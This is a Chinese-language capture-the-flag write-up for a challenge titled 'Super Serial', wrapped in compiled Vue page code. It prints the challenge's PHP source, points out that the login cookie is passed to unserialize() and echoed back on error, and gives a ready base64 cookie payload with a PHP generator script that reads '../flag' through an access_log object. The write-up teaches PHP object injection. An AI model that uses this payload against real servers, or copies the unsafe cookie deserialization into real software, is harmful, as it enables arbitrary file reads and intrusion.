import{_ as n,o as s,c as a,e as t}from"./app-855cd45a.js";const p={},e=t(`<p>robots.txt 有admin.phps 但是not found , 但同时说明了phps可能可用，由此得到</p><h4 id="index-php" tabindex="-1"><a class="header-anchor" href="#index-php" aria-hidden="true">#</a> index.php</h4><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;cookie.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;user&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;pass&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;../users.db&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;user&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;pass&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$perm_res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">permissions</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token operator">-&gt;</span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$perm_res</span><span class="token operator">-&gt;</span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;login&quot;</span><span class="token punctuation">,</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">86400</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Location: authentication.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&lt;h6 class=&quot;text-center&quot; style=&quot;color:red&quot;&gt;Invalid Login.&lt;/h6&gt;&#39;</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="cookie-php" tabindex="-1"><a class="header-anchor" href="#cookie-php" aria-hidden="true">#</a> cookie.php</h4><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">permissions</span>
<span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>

	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$u</span><span class="token punctuation">;</span>
		<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token variable">$u</span><span class="token operator">.</span><span class="token variable">$p</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function-definition function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$guest</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

		<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;../users.db&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span>
		<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span>
		<span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;SELECT admin, username FROM users WHERE username=? AND password=?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$stm</span><span class="token operator">-&gt;</span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$stm</span><span class="token operator">-&gt;</span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$stm</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$rest</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;username&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;admin&quot;</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token variable">$guest</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">return</span> <span class="token variable">$guest</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

        <span class="token keyword">function</span> <span class="token function-definition function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

                <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;../users.db&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span>
                <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span> <span class="token operator">=</span> <span class="token variable">$con</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;SELECT admin, username FROM users WHERE username=? AND password=?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span><span class="token operator">-&gt;</span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$stm</span><span class="token operator">-&gt;</span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token constant">SQLITE3_TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$stm</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$rest</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;username&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rest</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;admin&quot;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">return</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;login&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">try</span><span class="token punctuation">{</span>
		<span class="token variable">$perm</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;login&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-&gt;</span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-&gt;</span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Error</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Deserialization error. &quot;</span><span class="token operator">.</span><span class="token variable">$perm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="authentication-php" tabindex="-1"><a class="header-anchor" href="#authentication-php" aria-hidden="true">#</a> authentication.php</h4><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">access_log</span>
<span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$log_file</span><span class="token punctuation">;</span>

	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lf</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">log_file</span> <span class="token operator">=</span> <span class="token variable">$lf</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function-definition function">append_to_log</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">log_file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function-definition function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">log_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;cookie.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$perm</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$perm</span><span class="token operator">-&gt;</span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;Welcome admin&quot;</span><span class="token punctuation">;</span>
	<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">access_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;access.log&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$log</span><span class="token operator">-&gt;</span><span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Logged in at &quot;</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Y-m-d&quot;</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
	<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;Welcome guest&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;login&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">try</span><span class="token punctuation">{</span>
		<span class="token variable">$perm</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;login&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-&gt;</span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-&gt;</span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Error</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Deserialization error. &quot;</span><span class="token operator">.</span><span class="token variable">$perm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里会将 <code>$_COOKIE[&quot;login&quot;]</code> 反序列化，可以通过改cookie来执行反序列化 我们看到出错的话会输出 <code>.$perm</code> ,可以如下，将结果base64 ，urlencode之后设置cookie、 login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9 即可得到返回的 <code>../flag</code> 文件内容</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">access_log</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$log_file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;../flag&#39;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">access_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10),o=[e];function c(l,i){return s(),a("div",null,o)}const r=n(p,[["render",c],["__file","Super Serial.html.vue"]]);export{r as default};
